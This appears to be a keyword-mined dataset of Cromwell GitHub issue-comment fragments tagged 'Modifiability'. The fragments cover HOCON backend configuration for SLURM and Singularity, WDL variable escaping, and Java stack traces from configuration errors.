WDL-draft2, as both POSIX and WDL-draft2 both use `${...}` for variable names. To escape past WDL-draft2, create two new runtime attributes and then use them in your submit. Example:; ```HOCON; runtime-attributes = """"""; String env_start=""${""; String env_end=""}""; # other variables here; """""". submit = """"""; qsub \; -P ${env_start}PROJECT:-raijin_project_id${env_end} \; ...; """"""; ```. > jobfs is a parameter used to control scratch space local to the execution node. Currently it is being passed as a string. Unfortunately you cannot define a parameter as rich as `memory`. For custom attributes one only has the choice of `Float`, `Int`, or `String`. If you don't like `String`, you could use a `Float` and have the WDL use `runtime { jobfs_gb: 4.0 }`, or just `runtime { jobfs: 4.0 }` and tell everyone to always using gigabytes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4967#issuecomment-492892439:1637,variab,variables,1637,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4967#issuecomment-492892439,3,['variab'],"['variable', 'variables']"
Modifiability,"is is ok!) so it's going to be closed. . ## Question 2: How do we add a Singularity backend?. But this is actually ok, because we realize that we don't need to add Singularity to Cromwell proper, it can just be a backend! But I didn't understand wdl, or any of the formats, so my crew in Cherry lab gave me a solid repo to startwith, and then it started to click!; - https://github.com/vsoch/wgbs-pipeline/pull/1. I was waiting for the Dockerfile test PR to pass, but realized it probably wouldn't, so I jumped on adding the example backend workflows (still without totally understanding what/why/how, but figuring out as I went):; - https://github.com/broadinstitute/cromwell/pull/4039. ## Question 3: But what about Cromwell+Singularity on Travis?. I got confused again when there were [requests for additional tests](https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519) (and something entirely different) that it made me step back. I had this growing feeling that started to solidify that there are too many layers. I am developing things and I **still** don't understand (or think Singularity is ready yet) to be any kind of backend. I'm forcing a dog into a cat shaped hole just because this is the hole I'm supposed to fill. Is that a good idea? I've lost sight of what the tool is trying to do. Cromwell is trying to make it easy to run a Singularity container. But if that's the case, then why has this command:. ```bash; singularity run shub://vsoch/hello-world; ```. turned into needing Cromwell (java and the jar), an inputs json file, a wdl specification, a backend configuration, and a runtime command that I can't seem to remember, and then the entire thing takes much longer than an instance to echo a tiny Rawwwwr! If this is the goal we are going for, is this making life easier for the scientist? If I'm a programmer person, and this is the minimum I am allowed for this to just run a simple container, what happens when it gets harder? I realized that witho",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:9217,layers,layers,9217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,1,['layers'],['layers']
Modifiability,"ity backend?; >; > But this is actually ok, because we realize that we don't need to add; > Singularity to Cromwell proper, it can just be a backend! But I didn't; > understand wdl, or any of the formats, so my crew in Cherry lab gave me a; > solid repo to startwith, and then it started to click!; >; > - vsoch/wgbs-pipeline#1 <https://github.com/vsoch/wgbs-pipeline/pull/1>; >; > I was waiting for the Dockerfile test PR to pass, but realized it probably; > wouldn't, so I jumped on adding the example backend workflows (still; > without totally understanding what/why/how, but figuring out as I went):; >; > - #4039 <https://github.com/broadinstitute/cromwell/pull/4039>; >; > Question 3: But what about Cromwell+Singularity on Travis?; >; > I got confused again when there were requests for additional tests; > <https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519>; > (and something entirely different) that it made me step back. I had this; > growing feeling that started to solidify that there are too many layers. I; > am developing things and I *still* don't understand (or think Singularity; > is ready yet) to be any kind of backend. I'm forcing a dog into a cat; > shaped hole just because this is the hole I'm supposed to fill. Is that a; > good idea? I've lost sight of what the tool is trying to do. Cromwell is; > trying to make it easy to run a Singularity container. But if that's the; > case, then why has this command:; >; > singularity run shub://vsoch/hello-world; >; > turned into needing Cromwell (java and the jar), an inputs json file, a; > wdl specification, a backend configuration, and a runtime command that I; > can't seem to remember, and then the entire thing takes much longer than an; > instance to echo a tiny Rawwwwr! If this is the goal we are going for, is; > this making life easier for the scientist? If I'm a programmer person, and; > this is the minimum I am allowed for this to just run a simple container,; > what happens when it get",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:11592,layers,layers,11592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,1,['layers'],['layers']
Modifiability,"job_shell. String docker_cwd; String docker_cid; String docker_script; String docker_out; String docker_err. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWor",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:3915,config,config,3915,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['config']
Modifiability,"k the job that Cromwell schedules through SLURM, it would always fail. But I'm fairly sure that the job was failing to start because it was trying to write stdout to `/cromwell-executions/.../execution/stdout`, this is what led me to #1499. 3. An easy fix, but if your backend doesn't export a job-id, you need to set `run-in-background = true` in that backend's config. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? queue; String? docker; String? docker_user; """"""; # you should have a submit script as well, ; submit-docker = """"""; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr ${""-p "" + queue} \; -t ${run",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:2921,config,config,2921,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,1,['config'],['config']
Modifiability,ker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitial,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4552,config,config,4552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['config']
Modifiability,ker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLife,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4424,Config,ConfigInitializationActor,4424,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability,l fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(C,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:2155,config,config,2155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['config'],['config']
Modifiability,"l schedules through SLURM, it would always fail. But I'm fairly sure that the job was failing to start because it was trying to write stdout to `/cromwell-executions/.../execution/stdout`, this is what led me to #1499. 3. An easy fix, but if your backend doesn't export a job-id, you need to set `run-in-background = true` in that backend's config. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? queue; String? docker; String? docker_user; """"""; # you should have a submit script as well, ; submit-docker = """"""; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr ${""-p "" + queue} \; -t ${runtime_minutes} ${""-c """,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:2928,Config,ConfigBackendLifecycleActorFactory,2928,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,1,['Config'],['ConfigBackendLifecycleActorFactory']
Modifiability,"lignment/shard-1/wf-alignment.cwl/96d7b606-e0fe-4305-a586-e0fc4acf76f8/call-process_alignment/shard-0/inputs/1628767813 [...]. [E::bwa_idx_load_from_disk] fail to locate the index files; ```; Is it expected to lose the original input file names when passing through the pipeline. A lot of tools are sensitive to these and this might be the underlying issue. Regarding the configuration, without `http {}` in under `engine -> filesystems` I get a complaint about it not being supported, even with `http {}` under `backend -> providers -> Local -> config -> filesystems`:; ```; java.lang.IllegalArgumentException: Either https://storage.googleapis.com/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa exists on a filesystem not supported by this instance of Cromwell, or a failure occurred while building an actionable path from it. Supported filesystems are: LinuxFileSystem. Failures: LinuxFileSystem: Cannot build a local path from https://storage.googleapis.com/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa (RuntimeException) Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$workflowInitializationFailed(MaterializeWorkflowDescriptorActor.scala:211); at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$2.applyOrElse(MaterializeWorkflowDescriptorActor.scala:181); at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$2.applyOrElse(MaterializeWorkflowDescriptorActor.scala:176); ```; I was trying to lift off how things were done with the Google/gcp resolution so added it in there to fix this issue. Is there a different configuration approach I should be using?. Thanks again for helping with this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425997320:2007,config,configure,2007,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425997320,2,['config'],"['configuration', 'configure']"
Modifiability,"localhost:8000; > [2021-05-14 14:28:43,33] [info] Slf4jLogger started; > [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; > [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; > java.lang.IllegalStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); > 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); > 	at akka.dispatch.Mailbox.exec(Mailbox.scala:24",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:1133,adapt,adapted,1133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053,1,['adapt'],['adapted']
Modifiability,"lure_to_message::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatemen",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103:2039,adapt,adapted,2039,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103,1,['adapt'],['adapted']
Modifiability,"lush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,22] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-10-23 17:49:23,62] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-10-23 17:49:23,67] [info] SingleWorkflowRunnerActor: Version 37-634ac5b-SNAP; [2018-10-23 17:49:23,68] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-10-23 17:49:23,76] [info] CWL (v1.0) workflow d186ca94-b85b-4729-befc-8ad28a05976c submitted; [2018-10-23 17:49:23,80] [info] SingleWorkflowRunnerActor: Workflow submitted d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,80] [info] 1 new workflows fetched; [2018-10-23 17:49:23,81] [info] WorkflowManagerActor Starting workflow d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,83] [info] WorkflowManagerActor Successfully started WorkflowActor-d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,84] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-10-23 17:49:23,84] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-10-23 17:49:23,88] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-10-23 17:49:23,97] [info] MaterializeWorkflowDescriptorActor [d186ca94]: Parsing workflow as CWL v1.0; [2018-10-23 17:49:24,53] [error] WorkflowManagerActor Workflow d186ca94-b85b-4729-befc-8ad28a05976c failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Custom type file:///home/jeremiah/code/gdc-dnaseq-cwl/workflows/bamfastq_align/test_pack.cwl#capture_kit.yml/capture_kit was referred to but not found in schema def SchemaDefRequirement([Lshapeless.$colo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:4192,config,configured,4192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,1,['config'],['configured']
Modifiability,"lways appears to be `true`, and thus not needed.; - `!isAliveCache.contains` followed by `isAliveCache.get` should be `isAliveCache.getOrElseUpdate(job, IsAliveCache(Instant.now))`.; - There should be only one `SharedFileSystemJob` per `SharedFileSystemAsyncJobExecutionActor`. The reason the values are passed around is because the actor is also partially stateless, using `context.become` to track the `SharedFileSystemJob`. This PR adds state more to the actor, outside of the context, but that shouldn't be needed if the `isAlive` check is switched to running due to multiple `scheduleOnce` calls. The tests are likely timing out because the of the extra checks to `isAlive`. The tests are meant to run as quickly as possible. In general, the order of the job completion checking should always be 1) multiple rc file polls, 2) 30 seconds later `isAlive` checks as necessary. This individual polling per job may overwhelm the SGE scheduler if hundreds or thousands of scatter jobs are running, so more work may need to be done in the future to simplify the qstat process to check jobs in batches. Notes on configuration:. The initial scheduling should also be configurable. It should be off by default. Also, the error code that is returned may want to be configurable and/or we would want the actor to handle this special case differently and reattempt instead of fail. Cromwell's SFS implementation assumes jobs will always be writing their rc files. If something else out there is truly killing the jobs, we will have to wire in a way for `poll` to return a `FailedRetryableExecutionHandle`. I'm not sure that writing a value into the rc file is the best way to do this, and not yet sure what a suitable alternative is also. That's all I've got for now. Thanks again for all your work so far! I'm also game if we move this discussion over to a github issue instead of a PR, as I suspect the final version will look a bit different, and we can discuss and capture any other design there instead.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238:2446,config,configuration,2446,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238,3,['config'],"['configurable', 'configuration']"
Modifiability,"ly sure that the job was failing to start because it was trying to write stdout to `/cromwell-executions/.../execution/stdout`, this is what led me to #1499. 3. An easy fix, but if your backend doesn't export a job-id, you need to set `run-in-background = true` in that backend's config. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? queue; String? docker; String? docker_user; """"""; # you should have a submit script as well, ; submit-docker = """"""; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr ${""-p "" + queue} \; -t ${runtime_minutes} ${""-c "" + cpus} --mem-per-cpu=${requested_memory_mb_per_core} \; --w",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:2965,config,config,2965,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,1,['config'],['config']
